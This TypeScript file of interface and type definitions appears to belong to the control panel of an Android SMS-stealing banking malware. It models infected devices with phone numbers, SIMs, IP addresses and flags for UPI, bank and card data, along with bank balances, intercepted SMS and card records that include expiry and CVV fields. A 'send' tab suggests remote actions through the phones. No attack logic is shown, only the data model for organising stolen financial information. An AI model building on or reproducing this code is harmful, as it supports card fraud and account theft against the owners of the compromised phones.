export interface SavedAccount {
  id: string
  url: string
  key: string
  label?: string
  savedAt: number
}

export interface Device {
  id: string
  name?: string
  model?: string
  androidVersion?: string
  sdk?: string
  phone?: string
  network?: string
  battery?: number
  isCharging?: boolean
  online?: boolean
  lastSeen?: number
  ip?: string
  storage?: string
  cpu?: string
  sim1?: string
  sim2?: string
  hasUpi?: boolean
  hasBank?: boolean
  hasCard?: boolean
  latestBalance?: string
  raw?: Record<string, unknown>
}

export interface BankEntry {
  id: string
  bankName: string
  balance?: string
  amount?: string
  type?: 'credit' | 'debit' | 'info'
  accountLast4?: string
  sender?: string
  body: string
  timestamp: number
}

export interface CardEntry {
  id: string
  last4: string
  type?: string
  expiry?: string
  cvv?: string
  body: string
  timestamp: number
}

export interface SmsEntry {
  id: string
  body: string
  address?: string
  timestamp: number
  type: 'bank' | 'card' | 'normal'
  sim?: number
}

export type FilterTab = 'all' | 'online' | 'offline' | 'upi' | 'bank' | 'card'
export type SortKey = 'newest' | 'oldest' | 'name' | 'battery'
export type DetailTab = 'info' | 'bank' | 'card' | 'sms' | 'send'

export interface ToastItem {
  id: string
  type: 'success' | 'error' | 'info' | 'warn'
  title: string
  message?: string
}
